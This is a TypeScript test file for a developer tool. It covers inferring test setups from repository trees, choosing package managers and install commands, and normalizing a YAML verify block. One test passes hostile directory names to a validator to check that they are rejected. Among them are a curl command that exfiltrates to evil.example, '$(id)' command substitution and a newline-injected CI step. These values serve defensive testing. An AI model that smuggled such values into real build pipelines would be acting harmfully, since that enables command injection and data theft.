// Offline: test-setup inference from a tree, .devasign.yml parsing.
//   node --import tsx/esm --test src/verify/detect.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { envVarNames, inferSetupFromTree, installCommandFor, nestedPackageDirs, isFrontendPath, isTestPath, pmFor } from "./detect.js";
import { BOOT_TIMEOUT, hasBootConfig, MAX_COMMAND, MAX_SERVERS, needsManagedBoot, normalizeVerifyBlock, parseDevasignVerify, RESERVED_SERVER_NAMES } from "./yml.js";

test("isTestPath / isFrontendPath heuristics", () => {
  for (const p of ["src/a.test.ts", "src/__tests__/b.tsx", "tests/c.py", "pkg/d_test.go", "e2e/login.spec.ts", "conftest.py"]) assert.ok(isTestPath(p), p);
  for (const p of ["src/a.ts", "README.md", "backend/src/routes/api.ts"]) assert.ok(!isTestPath(p), p);
  assert.ok(isFrontendPath("frontend/src/app.tsx"));
  assert.ok(!isFrontendPath("backend/src/api.ts"));
});

test("inferSetupFromTree: pnpm monorepo with vitest + playwright + postgres", () => {
  const setup = inferSetupFromTree(
    ["package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml", "vitest.config.ts", "playwright.config.ts", "apps/web/package.json", "apps/web/src/a.tsx", "packages/db/package.json", "packages/db/src/x.ts", ".github/workflows/ci.yml", "prisma/schema.prisma"],
    {
      packageJson: JSON.stringify({ scripts: { test: "vitest run", "test:e2e": "playwright test" }, devDependencies: { vitest: "^2.0.0", "@playwright/test": "^1.45.0" }, engines: { node: ">=20" } }),
      envExample: "DATABASE_URL=postgres://x\nREDIS_URL=redis://y\n# comment\nAPI_KEY=\n",
    }
  );
  assert.equal(setup.packageManager, "pnpm");
  assert.deepEqual(setup.monorepo, { tool: "pnpm", packages: ["apps/web", "packages/db"] });
  assert.deepEqual(setup.frameworks.map((f) => f.name), ["vitest", "playwright"]);
  assert.equal(setup.frameworks[1].configPath, "playwright.config.ts");
  assert.equal(setup.frameworks[0].version, "2.0.0");
  assert.deepEqual(setup.services, ["postgres", "redis"]);
  assert.deepEqual(setup.envExampleVars, ["DATABASE_URL", "REDIS_URL", "API_KEY"]);
  assert.deepEqual(setup.existingWorkflows, [".github/workflows/ci.yml"]);
  assert.equal(setup.nodeVersion, ">=20");
  assert.equal(setup.testCommands.length, 2);
});

test("inferSetupFromTree: python + go + node --test, and an empty repo", () => {
  const py = inferSetupFromTree(["pyproject.toml", "app/main.py", "tests/test_main.py"]);
  assert.equal(py.packageManager, "pip");
  assert.deepEqual(py.frameworks.map((f) => f.name), ["pytest"]);
  const go = inferSetupFromTree(["go.mod", "main.go", "main_test.go"]);
  assert.deepEqual(go.frameworks.map((f) => f.name), ["go-test"]);
  const node = inferSetupFromTree(["package.json", "package-lock.json", "src/a.ts"], { packageJson: JSON.stringify({ scripts: { test: "node --import tsx/esm --test 'src/**/*.test.ts'" } }) });
  assert.deepEqual(node.frameworks.map((f) => f.name), ["node-test"]);
  const empty = inferSetupFromTree(["index.html"]);
  assert.deepEqual(empty.frameworks, []);
  assert.equal(empty.packageManager, null);
  assert.deepEqual(envVarNames(null), []);
});

test("inferSetupFromTree: dependencies are absent only when a root manifest exists but was not read", () => {
  const unread = inferSetupFromTree(["package.json", "src/a.ts"]);
  assert.equal(unread.dependencies, undefined, "a manifest we could not read is a blind spot");
  const subdirsOnly = inferSetupFromTree(["frontend/package.json", "frontend/src/a.tsx", "backend/package.json"]);
  assert.deepEqual(subdirsOnly.dependencies, [], "nothing installs at a root with no manifest");
  const read = inferSetupFromTree(["package.json", "src/a.ts"], { packageJson: JSON.stringify({ dependencies: { react: "^18" } }) });
  assert.deepEqual(read.dependencies, ["react"]);
});

test("parseDevasignVerify reads the verify block and ignores the rest", () => {
  const cfg = parseDevasignVerify(`
version: 2
family:
  name: acme
verify:
  e2e: always
  install: pnpm install
  start: pnpm dev
  url: http://localhost:3000
  ready: /healthz
  services:
    - postgres
    - { name: redis, image: redis:7 }
    - mongo
  login:
    strategy: form
    form: { url: /login, user: $E2E_USER, pass: $E2E_PASS }
  env: [DATABASE_URL, 42]
`);
  assert.ok(cfg);
  assert.equal(cfg!.e2e, "always");
  assert.equal(cfg!.start, "pnpm dev");
  assert.deepEqual(cfg!.services, [{ name: "postgres" }, { name: "redis", image: "redis:7" }]);
  assert.equal(cfg!.login?.strategy, "form");
  assert.equal(cfg!.login?.form?.user, "$E2E_USER");
  assert.deepEqual(cfg!.env, ["DATABASE_URL"]);
  assert.equal(hasBootConfig(cfg), true);
  assert.equal(hasBootConfig(parseDevasignVerify("verify:\n  e2e: never\n")), false);
  assert.equal(parseDevasignVerify("family:\n  name: x\n"), null);
  assert.equal(parseDevasignVerify(": : not yaml ["), null);
  assert.equal(parseDevasignVerify("verify:\n  e2e: sometimes\n")?.e2e, undefined);
});

// Mirrored in verify/src/yml.test.ts; the two normalizers must agree case for case.
test("normalizeVerifyBlock bounds timeout, keeps valid distinct servers up to the cap, and reads a login script without a strategy", () => {
  const cfg = normalizeVerifyBlock({
    start: "npm run dev",
    url: "http://localhost:5173",
    timeout: 5000,
    servers: [
      { name: "api", start: "npm start", url: "http://localhost:8787", ready: "/health" },
      { name: "API", start: "a", url: "http://localhost:1" },
      { name: "-api", start: "a", url: "http://localhost:1" },
      { name: "api", start: "dup", url: "http://localhost:2" },
      { name: "worker", start: "npm run worker" },
      "redis",
      { name: "w1", start: "b", url: "http://localhost:3" },
      { name: "w2", start: "c", url: "http://localhost:4" },
      { name: "w3", start: "d", url: "http://localhost:5" },
      { name: "w4", start: "e", url: "http://localhost:6" },
    ],
    login: { script: "node scripts/devasign-login.mjs", check: "/api/me", strategy: "magic" },
  });
  assert.equal(cfg?.timeout, BOOT_TIMEOUT.max);
  assert.deepEqual(cfg?.servers?.map((s) => s.name), ["api", "w1", "w2", "w3"]);
  assert.equal(cfg?.servers?.length, MAX_SERVERS);
  assert.deepEqual(cfg?.servers?.[0], { name: "api", start: "npm start", url: "http://localhost:8787", ready: "/health" });
  assert.deepEqual(cfg?.login, { script: "node scripts/devasign-login.mjs", check: "/api/me" });
  assert.equal(needsManagedBoot(cfg), true);

  assert.equal(normalizeVerifyBlock({ timeout: 1 })?.timeout, BOOT_TIMEOUT.min);
  assert.equal(normalizeVerifyBlock({ timeout: 12.5 })?.timeout, undefined);
  assert.equal(normalizeVerifyBlock({ timeout: "60" })?.timeout, undefined);
  assert.deepEqual(normalizeVerifyBlock({ login: { strategy: "none" } })?.login, { strategy: "none" });
  assert.deepEqual(normalizeVerifyBlock({ login: {}, servers: [{ name: "Bad!", start: "x", url: "y" }] }), {});
  assert.equal(normalizeVerifyBlock(["verify"]), null);
  assert.equal(needsManagedBoot(normalizeVerifyBlock({ login: { check: "/api/me", strategy: "cookie" } })), false, "a check alone boots nothing");
  assert.equal(needsManagedBoot({ start: "npm start", url: "http://localhost:3000" }), false);
  assert.equal(needsManagedBoot(normalizeVerifyBlock({ login: { script: "node login.mjs" } })), true);
});

test("normalizeVerifyBlock never cuts a command short and refuses server names the runner's own boot steps use", () => {
  const long = `npm ci --prefix frontend && ${"npm ci --prefix packages/some-workspace && ".repeat(12)}npm run build --workspace contrib`;
  assert.ok(long.length > 540);
  const tooLong = `echo ${"x".repeat(MAX_COMMAND)}`;
  const cfg = normalizeVerifyBlock({
    install: long,
    build: tooLong,
    start: long,
    url: "http://localhost:5173",
    servers: [
      ...[...RESERVED_SERVER_NAMES].map((name) => ({ name, start: "node api.mjs", url: "http://localhost:8787" })),
      { name: "a".repeat(33), start: "node x.mjs", url: "http://localhost:1" },
      { name: "worker", start: tooLong, url: "http://localhost:2" },
      { name: "api", start: long, url: "http://localhost:8787" },
    ],
    login: { script: long, check: tooLong },
  });
  assert.equal(cfg?.install, long);
  assert.equal(cfg?.start, long);
  assert.equal(cfg?.login?.script, long);
  assert.equal("build" in cfg!, false, "an over-long command is dropped whole");
  assert.equal(cfg?.login?.check, undefined);
  assert.deepEqual(cfg?.servers, [{ name: "api", start: long, url: "http://localhost:8787" }], "a reserved or over-long name is dropped, never cut to fit");
  assert.deepEqual([...RESERVED_SERVER_NAMES].sort(), ["app", "build", "install", "login", "seed"]);
});

test("no root manifest: top-level packages are the install units, with their own lockfiles and a nested Playwright config", () => {
  assert.deepEqual(nestedPackageDirs(["package.json", "backend/package.json", "frontend/package.json", "tools/x/package.json"]), ["backend", "frontend"]);
  assert.equal(installCommandFor("backend", ["backend/package-lock.json"]), "npm ci --prefix backend");
  assert.equal(installCommandFor("web", ["web/pnpm-lock.yaml"]), "pnpm install --frozen-lockfile --dir web");
  assert.equal(installCommandFor("web", ["web/package.json"]), "npm install --prefix web");

  const paths = ["backend/package.json", "backend/package-lock.json", "backend/src/a.ts", "frontend/package.json", "frontend/playwright.config.ts", "frontend/vitest.config.ts"];
  const s = inferSetupFromTree(paths);
  assert.deepEqual(s.packages, ["backend", "frontend"]);
  assert.equal(s.packageManager, "npm");
  assert.deepEqual(s.dependencies, [], "a relocated test still resolves bare imports from a root that installs nothing");
  assert.deepEqual(s.frameworks, [{ name: "playwright", version: undefined, configPath: "frontend/playwright.config.ts" }], "nested vitest is not importable from the root; Playwright is supplied by the runner");

  const rooted = inferSetupFromTree(["package.json", "backend/package.json"], { packageJson: "{}" });
  assert.equal(rooted.packages, undefined, "a root manifest is the install unit");
});

test("a directory name a shell would read as more than a name is not a package directory", () => {
  // Git allows every byte but "/" in a path component, and these names reach `run:` steps.
  const hostile = [
    "web;curl -d @- evil.example/package.json",
    "a b/package.json",
    "$(id)/package.json",
    "we`b`/package.json",
    "-rf/package.json",
    "../package.json",
    "web\n- run: echo pwned/package.json",
  ];
  assert.deepEqual(nestedPackageDirs([...hostile, "frontend/package.json"]), ["frontend"]);
  assert.deepEqual(nestedPackageDirs(["..%2f/package.json"]), [], "nothing that is not [A-Za-z0-9_.-] survives");
});

test("the install step and the start command name the same package manager for a directory", () => {
  // A lockfile at the root only: pmFor looked there and installCommandFor did not, so CI
  // installed with npm and the committed start command booted with pnpm.
  for (const [lock, install] of [
    ["pnpm-lock.yaml", "pnpm install --frozen-lockfile --dir frontend"],
    ["yarn.lock", "yarn install --frozen-lockfile --cwd frontend"],
    ["bun.lockb", "bun install --cwd frontend"],
    ["package-lock.json", "npm install --prefix frontend"],
  ] as const) {
    const paths = [lock, "frontend/package.json"];
    assert.equal(pmFor("frontend", paths), install.split(" ")[0]);
    assert.equal(installCommandFor("frontend", paths), install);
  }
  assert.equal(installCommandFor("frontend", ["pnpm-lock.yaml", "frontend/package-lock.json", "frontend/package.json"]), "npm ci --prefix frontend", "its own lockfile still wins over the root's");
});
